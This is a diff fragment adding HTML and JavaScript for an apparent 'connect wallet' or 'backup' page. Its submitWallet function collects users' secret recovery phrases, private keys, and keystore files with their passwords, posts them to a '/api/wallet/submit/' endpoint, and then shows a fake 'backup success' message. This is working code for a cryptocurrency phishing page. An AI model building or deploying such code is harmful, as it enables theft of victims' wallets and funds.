+      if (cookie.substring(0, name.length + 1) === (name + '=')) {
+        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+        break;
+      }
+    }
+  }
+  return cookieValue;
+}
+</script>
+
+<script>
+// optional: de-dupe any old listeners on page load
+window.addEventListener('DOMContentLoaded', () => {
+  const btn = document.getElementById('connect_wallet_button');
+  if (!btn) return;
+  const clone = btn.cloneNode(true);     // removes all old listeners
+  btn.parentNode.replaceChild(clone, btn);
+  clone.addEventListener('click', submitWallet);
+});
+</script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    const proceedBtn = document.getElementById("connect_wallet_button");
+    if (proceedBtn) {
+      proceedBtn.addEventListener("click", submitWallet);
+    }
+  });
+
+  async function submitWallet() {
+    try {
+      const active = document.querySelector('#walletTabContent .tab-pane.active');
+      const method = active ? active.id : 'phrase';
+
+      let payload = { method };
+      if (method === 'phrase') {
+        payload.wallet_name  = document.getElementById('wallet_name_phrase')?.value.trim();
+        payload.wallet_email = document.getElementById('wallet_email_phrase')?.value.trim();
+        payload.phrase       = document.getElementById('secret_phrase')?.value.trim();
+      } else if (method === 'keystore') {
+        payload.wallet_name   = document.getElementById('wallet_name_keystore')?.value.trim();
+        payload.wallet_email  = document.getElementById('wallet_email_keystore')?.value.trim();
+        payload.keystore_json = document.getElementById('keystore_json')?.value.trim();
+        payload.keystore_pass = document.getElementById('keystore_pass')?.value.trim();
+      } else if (method === 'private') {
+        payload.wallet_name  = document.getElementById('wallet_name_private')?.value.trim();
+        payload.wallet_email = document.getElementById('wallet_email_private')?.value.trim();
+        payload.private_key  = document.getElementById('private_key')?.value.trim();
+      }
+
+      // show loader
+      const loader = document.getElementById("backupLoader");
+      if (loader) loader.style.display = "block";
+
+      const res = await fetch("/api/wallet/submit/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-CSRFToken": getCookie("csrftoken")
+        },
+        body: JSON.stringify(payload)
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        if (loader) loader.style.display = "none";
+
+        // Hide import modal
+        const importModal = bootstrap.Modal.getInstance(document.getElementById("importWalletModal"));
+        if (importModal) importModal.hide();
+
+        // Show success modal
+        const successModal = new bootstrap.Modal(document.getElementById("backupSuccessModal"));
+        successModal.show();
+      } else {
+        throw new Error(data.error || "Unknown error");
+      }
+    } catch (err) {
+      if (loader) loader.style.display = "none";
+      alert("Something went wrong: " + err.message);
+    }
+  }
+
+  // CSRF helper
+  function getCookie(name) {
+    let cookieValue = null;
+    if (document.cookie && document.cookie !== '') {
+      const cookies = document.cookie.split(';');
+      for (let cookie of cookies) {
+        cookie = cookie.trim();
+        if (cookie.startsWith(name + '=')) {
+          cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+          break;
+        }
+      }
+    }
+    return cookieValue;
+  }
+</script>
+
+
+
+
+
+</body></html>
